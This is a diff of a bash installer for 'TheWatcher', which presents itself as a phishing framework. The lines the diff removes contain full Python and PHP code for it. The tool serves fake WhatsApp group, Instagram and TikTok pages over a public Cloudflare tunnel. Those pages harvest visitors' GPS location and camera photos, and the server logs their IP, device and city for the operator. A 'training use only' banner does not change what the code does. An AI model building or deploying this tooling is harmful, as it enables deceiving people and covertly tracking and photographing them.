@@ -1,107 +1,86 @@
 #!/usr/bin/env bash
-# ==================== COLORS ====================
 RED='\033[91m'
 GREEN='\033[92m'
 YELLOW='\033[93m'
 BLUE='\033[94m'
 CYAN='\033[96m'
 WHITE='\033[97m'
-GRAY='\033[90m'
 BOLD='\033[1m'
 END='\033[0m'
 
-# ==================== DETECT SYSTEM ====================
-detect_system() {
-    if [[ -d "/data/data/com.termux/files/usr" ]]; then
-        SYSTEM="termux"
-        PYTHON_CMD="python"
-    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
-        SYSTEM="linux"
-        PYTHON_CMD="python3"
-    elif [[ "$OSTYPE" == "darwin"* ]]; then
-        SYSTEM="macos"
-        PYTHON_CMD="python3"
-    else
-        SYSTEM="unknown"
-        PYTHON_CMD="python3"
-    fi
-}
-
-# ==================== BANNER ====================
-banner() {
-    clear
-    echo -e "${RED}${BOLD}"
-    echo '      ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  '
-    echo '      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒'
-    echo '      ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒'
-    echo '      ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  '
-    echo '        ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒'
-    echo '        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░'
-    echo '          ░     ▒ ░▒░ ░ ░ ░  ░     ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░'
-    echo '        ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ '
-    echo '                ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     '
-    echo '                            ~EvilmaxSec | Tz~'
-    echo -e "${END}"
-    echo -e "${CYAN}${BOLD}"
-    echo '╔═══════════════════════════════════════════════════════════════════════════╗'
-    echo '║                    TheWatcher Installer                                   ║'
-    echo '║                      Auto-Detects & Installs Everything                   ║'
-    echo '╚═══════════════════════════════════════════════════════════════════════════╝'
-    echo -e "${END}\n"
-}
-
 print_success() { echo -e "  ${GREEN}✓${END} ${WHITE}$1${END}"; }
-print_error() { echo -e "  ${RED}✗${END} ${WHITE}$1${END}"; }
 print_info() { echo -e "  ${BLUE}ℹ${END} ${WHITE}$1${END}"; }
-print_warning() { echo -e "  ${YELLOW}⚠${END} ${WHITE}$1${END}"; }
+print_error() { echo -e "  ${RED}✗${END} ${WHITE}$1${END}"; }
 
-# ==================== INSTALL PHP ====================
-install_php() {
-    print_info "Installing PHP..."
-    
-    if [[ "$SYSTEM" == "termux" ]]; then
-        pkg install php -y 2>/dev/null || true
-    elif [[ "$SYSTEM" == "linux" ]]; then
-        if command -v apt &>/dev/null; then
-            sudo apt update -y 2>/dev/null || true
-            sudo apt install php -y 2>/dev/null || true
-        fi
-    elif [[ "$SYSTEM" == "macos" ]]; then
-        if command -v brew &>/dev/null; then
-            brew install php 2>/dev/null || true
-        fi
-    fi
-    
-    if command -v php &>/dev/null; then
-        print_success "PHP installed"
-    else
-        print_warning "PHP not found"
-    fi
-}
+clear
+echo -e "${CYAN}${BOLD}"
+echo '╔═══════════════════════════════════════════════════════════════╗'
+echo '║              TheWatcher Installer                             ║'
+echo '║           Auto-detects system and installs requirements       ║'
+echo '╚═══════════════════════════════════════════════════════════════╝'
+echo -e "${END}\n"
 
-# ==================== INSTALL PYTHON DEPS ====================
-install_python_deps() {
-    print_info "Installing Python dependencies..."
-    pip install requests -q 2>/dev/null || pip3 install requests -q 2>/dev/null || true
-    print_success "Dependencies installed"
-}
+# Detect system
+if [[ -d "/data/data/com.termux/files/usr" ]]; then
+    SYSTEM="termux"
+    print_info "Detected: Termux (Android)"
+elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
+    SYSTEM="linux"
+    print_info "Detected: Linux"
+elif [[ "$OSTYPE" == "darwin"* ]]; then
+    SYSTEM="macos"
+    print_info "Detected: macOS"
+else
+    SYSTEM="unknown"
+    print_info "Detected: Unknown system"
+fi
 
-# ==================== INSTALL CLOUDFLARED ====================
-install_cloudflared() {
-    echo ""
-    read -p "$(echo -e "  ${YELLOW}?${END} ${WHITE}Install Cloudflared for public URLs? (y/N): ${END}")" -n 1 -r
-    echo ""
-    
-    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
-        return 0
+# Create directories
+mkdir -p modules data templates 2>/dev/null
+
+# Install Python dependencies
+print_info "Installing Python dependencies..."
+pip install requests -q 2>/dev/null || pip3 install requests -q 2>/dev/null
+print_success "Python dependencies installed"
+
+# Install PHP based on system
+print_info "Installing PHP..."
+if [[ "$SYSTEM" == "termux" ]]; then
+    pkg install php -y 2>/dev/null
+elif [[ "$SYSTEM" == "linux" ]]; then
+    if command -v apt &>/dev/null; then
+        sudo apt update -y 2>/dev/null
+        sudo apt install php -y 2>/dev/null
+    elif command -v yum &>/dev/null; then
+        sudo yum install php -y 2>/dev/null
+    elif command -v pacman &>/dev/null; then
+        sudo pacman -S php --noconfirm 2>/dev/null
     fi
-    
+elif [[ "$SYSTEM" == "macos" ]]; then
+    if command -v brew &>/dev/null; then
+        brew install php 2>/dev/null
+    fi
+fi
+
+if command -v php &>/dev/null; then
+    print_success "PHP installed"
+else
+    print_error "PHP installation failed. Install manually:"
+    echo "  Termux: pkg install php"
+    echo "  Linux: sudo apt install php"
+    echo "  macOS: brew install php"
+fi
+
+# Install Cloudflared (optional)
+echo ""
+read -p "$(echo -e "  ${YELLOW}?${END} ${WHITE}Install Cloudflared for public URLs? (y/N): ${END}")" -n 1 -r
+echo ""
+if [[ $REPLY =~ ^[Yy]$ ]]; then
     print_info "Installing Cloudflared..."
-    
     if [[ "$SYSTEM" == "termux" ]]; then
         wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
         chmod +x cloudflared
-        mv cloudflared $PREFIX/bin/ 2>/dev/null || true
+        mv cloudflared $PREFIX/bin/ 2>/dev/null
     elif [[ "$SYSTEM" == "linux" ]]; then
         ARCH=$(uname -m)
         if [[ "$ARCH" == "aarch64" ]] || [[ "$ARCH" == "arm64" ]]; then
@@ -110,490 +89,20 @@ install_cloudflared() {
             wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
         fi
         chmod +x cloudflared
-        sudo mv cloudflared /usr/local/bin/ 2>/dev/null || true
+        sudo mv cloudflared /usr/local/bin/ 2>/dev/null
     fi
     
-    print_success "Cloudflared installed"
-}
+    if command -v cloudflared &>/dev/null; then
+        print_success "Cloudflared installed"
+    else
+        print_error "Cloudflared installation failed"
+    fi
+fi
 
-# ==================== CREATE COMPLETE FILES ====================
-create_files() {
-    print_info "Creating TheWatcher files..."
+# Download modules if missing
+if [[ ! -f "modules/__init__.py" ]] || [[ ! -f "modules/cloudflare.py" ]] || [[ ! -f "modules/templates.py" ]]; then
+    print_info "Downloading module files..."
     
-    cd "$INSTALL_DIR"
-    
-    # Create directories
-    mkdir -p data templates modules logs
-    
-    # ==================== CREATE COMPLETE thewatcher.py ====================
-    cat > thewatcher.py << 'THEWATCHER_EOF'
-#!/usr/bin/env python3
-"""
-TheWatcher v2.0 - Professional Red Team Framework
-Author: EvilmaxSec
-"""
-
-import os
-import sys
-import time
-import json
-import subprocess
-import threading
-import re
-import socket
-
-class Colors:
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    GRAY = '\033[90m'
-    BOLD = '\033[1m'
-    END = '\033[0m'
-
-def clear():
-    os.system('clear' if os.name == 'posix' else 'cls')
-
-def banner():
-    clear()
-    print(f"""{Colors.RED}{Colors.BOLD}
-      ▄▄▄█████▓ ██░ ██ ▓█████     █     █░ ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██ ▓█████  ██▀███  
-      ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▓█░ █ ░█░▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
-      ▒ ▓██░ ▒░▒██▀▀██░▒███      ▒█░ █ ░█ ▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░▒███   ▓██ ░▄█ ▒
-      ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄    ░█░ █ ░█ ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  
-        ▒██▒ ░ ░▓█▒░██▓░▒████▒   ░░██▒██▓  ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓░▒████▒░██▓ ▒██▒
-        ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
-          ░     ▒ ░▒░ ░ ░ ░  ░     ▒ ░ ░    ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
-        ░       ░  ░░ ░   ░        ░   ░    ░   ▒    ░      ░         ░  ░░ ░   ░     ░░   ░ 
-                ░  ░  ░   ░  ░       ░          ░  ░        ░ ░       ░  ░  ░   ░  ░   ░     
-                            ~EvilmaxSec | Tz~
-{Colors.END}
-{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}
-{Colors.RED}{Colors.BOLD}║         TheWatcher Advanced Phishing Framework               ║{Colors.END}
-{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}
-{Colors.GRAY}┌────────────────────────────────────────────────────────────────────────┐
-│  {Colors.WHITE}Author: {Colors.RED}EvilmaxSec{Colors.GRAY}                                                     │
-│  {Colors.WHITE}GitHub: {Colors.GRAY}https://github.com/EvilmaxSec{Colors.GRAY}                                       │
-│  {Colors.RED}⚠  AUTHORIZED TRAINING USE ONLY  ⚠{Colors.GRAY}                                    │
-└────────────────────────────────────────────────────────────────────────┘{Colors.END}
-""")
-
-def print_menu(title, options):
-    print(f"\n{Colors.CYAN}{Colors.BOLD}┌─────────────────────────────────────────────────┐{Colors.END}")
-    print(f"{Colors.CYAN}{Colors.BOLD}│          {title:<37}{Colors.CYAN}{Colors.BOLD}│{Colors.END}")
-    print(f"{Colors.CYAN}{Colors.BOLD}├─────────────────────────────────────────────────┤{Colors.END}")
-    for key, value in options.items():
-        print(f"{Colors.CYAN}{Colors.BOLD}│{Colors.END}  {Colors.RED}[{key}]{Colors.END} {Colors.WHITE}{value:<39}{Colors.CYAN}{Colors.BOLD}│{Colors.END}")
-    print(f"{Colors.CYAN}{Colors.BOLD}└─────────────────────────────────────────────────┘{Colors.END}")
-
-def print_success(msg): print(f"  {Colors.GREEN}✓{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
-def print_error(msg): print(f"  {Colors.RED}✗{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
-def print_info(msg): print(f"  {Colors.BLUE}ℹ{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
-def print_warning(msg): print(f"  {Colors.YELLOW}⚠{Colors.END} {Colors.WHITE}{msg}{Colors.END}")
-
-def get_input(prompt, default=""):
-    if default:
-        val = input(f"  {Colors.RED}➜{Colors.END} {Colors.WHITE}{prompt}{Colors.GRAY} [{default}]:{Colors.END} ")
-        return val if val else default
-    return input(f"  {Colors.RED}➜{Colors.END} {Colors.WHITE}{prompt}:{Colors.END} ")
-
-def get_number(prompt, min_val, max_val):
-    while True:
-        try:
-            val = int(get_input(prompt))
-            if min_val <= val <= max_val:
-                return val
-            print_error(f"Enter {min_val}-{max_val}")
-        except ValueError:
-            print_error("Enter a number")
-
-def get_local_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except:
-        return "127.0.0.1"
-
-def check_command(cmd):
-    try:
-        subprocess.run([cmd, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return True
-    except FileNotFoundError:
-        return False
-
-def get_image_source(prompt_type):
-    print(f"\n  {Colors.CYAN}📸 {prompt_type}{Colors.END}")
-    print(f"  {Colors.GRAY}[1] Use image URL{Colors.END}")
-    print(f"  {Colors.GRAY}[2] Use local image file{Colors.END}")
-    
-    choice = get_input("Choose option", "1")
-    
-    if choice == "1":
-        return get_input("Enter image URL", "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop")
-    else:
-        while True:
-            path = get_input("Enter local image path")
-            if os.path.exists(path) and os.path.isfile(path):
-                return path
-            print_error(f"File not found: {path}")
-            retry = get_input("Try again? (y/n)", "y")
-            if retry.lower() != 'y':
-                return "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&h=120&fit=crop"
-
-def get_video_source():
-    print(f"\n  {Colors.CYAN}🎬 Video Source{Colors.END}")
-    print(f"  {Colors.GRAY}[1] Use video URL{Colors.END}")
-    print(f"  {Colors.GRAY}[2] Use local video file{Colors.END}")
-    
-    choice = get_input("Choose option", "1")
-    
-    if choice == "1":
-        return get_input("Enter video URL", "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4")
-    else:
-        while True:
-            path = get_input("Enter local video path")
-            if os.path.exists(path) and os.path.isfile(path):
-                return path
-            print_error(f"File not found: {path}")
-            retry = get_input("Try again? (y/n)", "y")
-            if retry.lower() != 'y':
-                return "https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"
-
-def clear_old_data():
-    if os.path.exists('data'):
-        for f in os.listdir('data'):
-            try:
-                os.unlink(os.path.join('data', f))
-            except:
-                pass
-    else:
-        os.makedirs('data', exist_ok=True)
-
-def monitor_data(stop_event):
-    processed = set()
-    while not stop_event.is_set():
-        time.sleep(1)
-        if os.path.exists('data'):
-            current = set(os.listdir('data'))
-            new_files = current - processed
-            for f in new_files:
-                if f.endswith('.json'):
-                    try:
-                        with open(f'data/{f}', 'r') as file:
-                            data = json.load(file)
-                            if 'coordinates' in data and data['coordinates'].get('latitude'):
-                                print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
-                                print(f"{Colors.GREEN}{Colors.BOLD}📍 NEW LOCATION CAPTURED!{Colors.END}")
-                                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
-                                print(f"  {Colors.YELLOW}Time:{Colors.END} {data.get('timestamp')}")
-                                print(f"  {Colors.YELLOW}IP:{Colors.END} {data.get('ip_address')}")
-                                print(f"  {Colors.YELLOW}GPS:{Colors.END} {data['coordinates']['latitude']}, {data['coordinates']['longitude']}")
-                                print(f"  {Colors.YELLOW}Device:{Colors.END} {data['device']['device']} | OS: {data['device']['os']}")
-                                print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}\n")
-                    except:
-                        pass
-                elif f.endswith('.jpg'):
-                    size = os.path.getsize(f'data/{f}') // 1024
-                    print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
-                    print(f"{Colors.GREEN}{Colors.BOLD}📸 NEW CAMERA IMAGE!{Colors.END}")
-                    print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}")
-                    print(f"  {Colors.YELLOW}File:{Colors.END} {f} ({size}KB)")
-                    print(f"{Colors.GREEN}{Colors.BOLD}{'='*70}{Colors.END}\n")
-            processed = current
-
-class TheWatcher:
-    def __init__(self):
-        self.monitor_thread = None
-        self.php_process = None
-        self.stop_monitor = threading.Event()
-    
-    def run_server(self, port, html):
-        clear_old_data()
-        os.makedirs('templates', exist_ok=True)
-        with open('templates/current.html', 'w', encoding='utf-8') as f:
-            f.write(html)
-        
-        print_info(f"Starting PHP server on port {port}...")
-        
-        if not check_command("php"):
-            print_error("PHP not installed")
-            sys.exit(1)
-        
-        self.stop_monitor.clear()
-        self.monitor_thread = threading.Thread(target=monitor_data, args=(self.stop_monitor,), daemon=True)
-        self.monitor_thread.start()
-        
-        self.php_process = subprocess.Popen(
-            ["php", "-S", f"0.0.0.0:{port}", "server.php"],
-            stderr=subprocess.PIPE,
-            stdout=subprocess.DEVNULL,
-            text=True,
-            bufsize=1
-        )
-        
-        def read_stderr():
-            for line in iter(self.php_process.stderr.readline, ''):
-                if line.strip():
-                    if "Accepted" in line or "Closing" in line or "Development Server" in line:
-                        continue
-                    print(line.strip())
-        
-        threading.Thread(target=read_stderr, daemon=True).start()
-        time.sleep(2)
-        
-        from modules.cloudflare import CloudflareTunnel
-        cf = CloudflareTunnel()
-        url = cf.start(port)
-        local_ip = get_local_ip()
-        
-        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
-        print(f"{Colors.CYAN}{Colors.BOLD}🌐 SHAREABLE LINKS{Colors.END}")
-        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.END}")
-        if url:
-            print_success(f"Cloudflare: {Colors.YELLOW}{url}{Colors.END}")
-        print_success(f"Local: http://localhost:{port}")
-        print_success(f"Network: http://{local_ip}:{port}")
-        
-        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════════════════════╗{Colors.END}")
-        print(f"{Colors.GREEN}{Colors.BOLD}║     🚀 TheWatcher Active!                            ║{Colors.END}")
-        print(f"{Colors.GREEN}{Colors.BOLD}║     📡 Waiting for targets...                       ║{Colors.END}")
-        print(f"{Colors.GREEN}{Colors.BOLD}║     🔴 Press Ctrl+C to stop                         ║{Colors.END}")
-        print(f"{Colors.GREEN}{Colors.BOLD}╚══════════════════════════════════════════════════════╝{Colors.END}\n")
-        
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print_warning("\nStopping server...")
-            self.stop_monitor.set()
-            if self.php_process:
-                self.php_process.terminate()
-            cf.stop()
-    
-    def location_menu(self):
-        print(f"\n{Colors.BLUE}{Colors.BOLD}📍 LOCATION TRACKING{Colors.END}")
-        print(f"{Colors.GRAY}{'─'*50}{Colors.END}")
-        
-        print_menu("SELECT TEMPLATE", {
-            "1": "WhatsApp Group Invite",
-            "2": "Instagram Story", 
-            "3": "TikTok Video"
-        })
-        
-        choice = get_number("Choose", 1, 3)
-        from modules.templates import TemplateManager
-        
-        if choice == 1:
-            name = get_input("Group name", "Security Group")
-            image = get_image_source("Group Image")
-            members = get_input("Members", "128")
-            html = TemplateManager.get_whatsapp_location(name, image, members)
-            port = get_number("Port (8080)", 1, 65535)
-            self.run_server(port, html)
-        elif choice == 2:
-            username = get_input("Username", "instagram")
-            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
-            profile = get_image_source("Profile Image")
-            video = get_video_source()
-            views = get_input("Views", "1.2M")
-            likes = get_input("Likes", "125K")
-            caption = get_input("Caption", "Check out my story!")
-            html = TemplateManager.get_instagram_story_custom(username, verified, profile, video, views, likes, caption)
-            port = get_number("Port (8080)", 1, 65535)
-            self.run_server(port, html)
-        elif choice == 3:
-            username = get_input("Username", "tiktok")
-            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
-            profile = get_image_source("Profile Image")
-            video = get_video_source()
-            views = get_input("Views", "1.2M")
-            likes = get_input("Likes", "125K")
-            comments = get_input("Comments", "12.5K")
-            shares = get_input("Shares", "5.2K")
-            caption = get_input("Caption", "Check this out!")
-            html = TemplateManager.get_tiktok_video_custom(username, verified, profile, video, views, likes, comments, shares, caption)
-            port = get_number("Port (8080)", 1, 65535)
-            self.run_server(port, html)
-    
-    def camera_menu(self):
-        print(f"\n{Colors.BLUE}{Colors.BOLD}📸 CAMERA ACCESS{Colors.END}")
-        print(f"{Colors.GRAY}{'─'*50}{Colors.END}")
-        
-        print_menu("SELECT TEMPLATE", {
-            "1": "Instagram Reel",
-            "2": "TikTok Video"
-        })
-        
-        choice = get_number("Choose", 1, 2)
-        from modules.templates import TemplateManager
-        
-        if choice == 1:
-            username = get_input("Username", "instagram")
-            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
-            profile = get_image_source("Profile Image")
-            video = get_video_source()
-            likes = get_input("Likes", "1.2M")
-            comments = get_input("Comments", "12.5K")
-            shares = get_input("Shares", "5.2K")
-            caption = get_input("Caption", "Amazing content!")
-            html = TemplateManager.get_instagram_camera(username, verified, profile, video, likes, comments, shares, caption)
-            port = get_number("Port (8080)", 1, 65535)
-            self.run_server(port, html)
-        elif choice == 2:
-            username = get_input("Username", "tiktok")
-            verified = get_input("Verified? (y/n)", "n").lower() == 'y'
-            profile = get_image_source("Profile Image")
-            video = get_video_source()
-            likes = get_input("Likes", "1.2M")
-            comments = get_input("Comments", "12.5K")
-            shares = get_input("Shares", "5.2K")
-            caption = get_input("Caption", "Check this out!")
-            html = TemplateManager.get_tiktok_camera(username, verified, profile, video, likes, comments, shares, caption)
-            port = get_number("Port (8080)", 1, 65535)
-            self.run_server(port, html)
-    
-    def view_data(self):
-        print(f"\n{Colors.BLUE}{Colors.BOLD}📊 COLLECTED DATA{Colors.END}")
-        print(f"{Colors.GRAY}{'─'*50}{Colors.END}")
-        
-        if not os.path.exists('data') or not os.listdir('data'):
-            print_warning("No data yet")
-            input("\n  Press Enter...")
-            return
-        
-        for f in os.listdir('data'):
-            if f.endswith('.json'):
-                try:
-                    with open(f'data/{f}', 'r') as file:
-                        data = json.load(file)
-                        print(f"\n  {Colors.GREEN}📄 {f}{Colors.END}")
-                        print(f"     {Colors.YELLOW}Time:{Colors.END} {data.get('timestamp')}")
-                        print(f"     {Colors.YELLOW}IP:{Colors.END} {data.get('ip_address')}")
-                        if 'coordinates' in data:
-                            print(f"     {Colors.YELLOW}GPS:{Colors.END} {data['coordinates'].get('latitude')}, {data['coordinates'].get('longitude')}")
-                except:
-                    pass
-            elif f.endswith('.jpg'):
-                size = os.path.getsize(f'data/{f}') // 1024
-                print(f"\n  {Colors.GREEN}📸 {f}{Colors.END} ({size}KB)")
-        
-        input("\n  Press Enter...")
-    
-    def main(self):
-        while True:
-            banner()
-            print_menu("MAIN MENU", {
-                "1": "📍 Track Location",
-                "2": "📸 Access Camera",
-                "3": "📊 View Data",
-                "4": "🚪 Exit"
-            })
-            
-            choice = get_input("\nSelect", "1")
-            
-            if choice == '1':
-                self.location_menu()
-            elif choice == '2':
-                self.camera_menu()
-            elif choice == '3':
-                self.view_data()
-            elif choice == '4':
-                print_success("Goodbye!")
-                sys.exit(0)
-            else:
-                print_error("Invalid")
-                time.sleep(1)
-
-if __name__ == "__main__":
-    watcher = TheWatcher()
-    watcher.main()
-THEWATCHER_EOF
-
-    chmod +x thewatcher.py
-    print_success "Created: thewatcher.py (complete version)"
-    
-    # ==================== CREATE server.php ====================
-    cat > server.php << 'SERVERPHP_EOF'
-<?php
-if (!is_dir('data')) mkdir('data',0755,true);
-if (!is_dir('templates')) mkdir('templates',0755,true);
-header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
-header('Access-Control-Allow-Headers: Content-Type');
-if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') { http_response_code(200); exit(); }
-$uri = strtok($_SERVER['REQUEST_URI'], '?');
-function getIP(){ $ip=$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'Unknown'; return trim(explode(',',$ip)[0]); }
-function logMsg($type,$data){
-    $out="\n".str_repeat("=",70)."\n".($type=='visit'?"🔴 NEW VISITOR DETECTED!":($type=='location'?"📍 LOCATION CAPTURED!":"📸 CAMERA CAPTURED!"))."\n".str_repeat("=",70)."\n";
-    $out.="  📅 Time: ".date('Y-m-d H:i:s')."\n  🌐 IP: {$data['ip']}\n";
-    if($type=='location') $out.="  📍 GPS: {$data['lat']}, {$data['lng']}\n";
-    $out.="  📱 Device: {$data['device']}\n  💻 OS: {$data['os']}\n  🌍 Browser: {$data['browser']}\n";
-    if($type!='camera') $out.="  🏙️ City: {$data['city']}\n";
-    $out.="  💾 Saved: {$data['file']}\n".str_repeat("=",70)."\n";
-    file_put_contents('php://stderr',$out);
-}
-function parseUA($ua){
-    $l=strtolower($ua);
-    $os='Unknown'; if(strpos($l,'android')!==false) $os='Android';
-    elseif(strpos($l,'iphone')!==false) $os='iOS';
-    elseif(strpos($l,'windows')!==false) $os='Windows';
-    elseif(strpos($l,'mac')!==false) $os='macOS';
-    elseif(strpos($l,'linux')!==false) $os='Linux';
-    $browser='Unknown';
-    if(strpos($l,'chrome')!==false && strpos($l,'edg')===false) $browser='Chrome';
-    elseif(strpos($l,'firefox')!==false) $browser='Firefox';
-    elseif(strpos($l,'safari')!==false && strpos($l,'chrome')===false) $browser='Safari';
-    elseif(strpos($l,'edg')!==false) $browser='Edge';
-    $device='Desktop'; if(strpos($l,'mobile')!==false) $device='Mobile Phone';
-    elseif(strpos($l,'tablet')!==false) $device='Tablet';
-    return ['os'=>$os,'browser'=>$browser,'device'=>$device];
-}
-function getGeo($ip){
-    if($ip=='127.0.0.1'||strpos($ip,'192.168.')===0||strpos($ip,'10.')===0) return ['country'=>'Local','city'=>'Local'];
-    $resp=@file_get_contents("http://ip-api.com/json/$ip");
-    if($resp){ $data=json_decode($resp,true);
-        if($data&&$data['status']=='success') return ['country'=>$data['country']??'Unknown','city'=>$data['city']??'Unknown'];
-    }
-    return ['country'=>'Unknown','city'=>'Unknown'];
-}
-if($uri=='/' && file_exists('templates/current.html')){
-    $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
-    $d=parseUA($ua); $g=getGeo($ip);
-    logMsg('visit',['ip'=>$ip,'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>'N/A']);
-    header('Content-Type:text/html'); readfile('templates/current.html'); exit();
-}
-if($uri=='/location' && $_SERVER['REQUEST_METHOD']=='POST'){
-    $data=json_decode(file_get_contents('php://input'),true);
-    if($data){
-        $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
-        $d=parseUA($ua); $g=getGeo($ip);
-        $f="data/location_".time().".json";
-        file_put_contents($f,json_encode(['timestamp'=>date('Y-m-d H:i:s'),'ip_address'=>$ip,'coordinates'=>['latitude'=>$data['lat'],'longitude'=>$data['lng'],'accuracy'=>$data['acc']],'device'=>$d,'network'=>$g],JSON_PRETTY_PRINT));
-        logMsg('location',['ip'=>$ip,'lat'=>$data['lat'],'lng'=>$data['lng'],'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>$f]);
-        header('Content-Type:application/json'); echo json_encode(['status'=>'ok']); exit();
-    }
-}
-if($uri=='/camera' && $_SERVER['REQUEST_METHOD']=='POST' && isset($_FILES['image'])){
-    $f="data/camera_".time().".jpg";
-    move_uploaded_file($_FILES['image']['tmp_name'],$f);
-    $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
-    $d=parseUA($ua); $g=getGeo($ip);
-    logMsg('camera',['ip'=>$ip,'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>$f]);
-    header('Content-Type:application/json'); echo json_encode(['status'=>'ok']); exit();
-}
-if(file_exists('templates/current.html')) readfile('templates/current.html');
-else echo "TheWatcher Ready";
-?>
-SERVERPHP_EOF
-
-    print_success "Created: server.php"
-    
-    # ==================== CREATE MODULES ====================
     mkdir -p modules
     
     cat > modules/__init__.py << 'EOF'
@@ -670,66 +179,30 @@ document.getElementById('closeModal').onclick=()=>{document.getElementById('moda
         return f"<html><body><h1>TikTok Camera</h1><p>@{u}</p></body></html>"
 EOF
 
-    print_success "Created: modules/"
-    
-    # Create start.sh
-    cat > start.sh << 'EOF'
-#!/bin/bash
-cd "$(dirname "$0")"
-echo -e "\033[96m🚀 Starting TheWatcher...\033[0m"
-python3 thewatcher.py
-EOF
-    chmod +x start.sh
-    
-    # Create requirements.txt
-    cat > requirements.txt << 'EOF'
-requests==2.31.0
-EOF
-}
+    print_success "Module files created"
+fi
 
-# ==================== MAIN ====================
-main() {
-    banner
-    detect_system
-    INSTALL_DIR="$HOME/TheWatcher"
-    
-    print_info "System: $SYSTEM"
-    print_info "Installing to: $INSTALL_DIR"
-    
-    # Remove old installation if exists
-    if [[ -d "$INSTALL_DIR" ]]; then
-        print_warning "Existing installation found"
-        read -p "  Remove and reinstall? (y/N): " -n 1 -r
-        echo
-        if [[ $REPLY =~ ^[Yy]$ ]]; then
-            rm -rf "$INSTALL_DIR"
-            print_success "Old installation removed"
-        else
-            print_info "Exiting"
-            exit 0
-        fi
-    fi
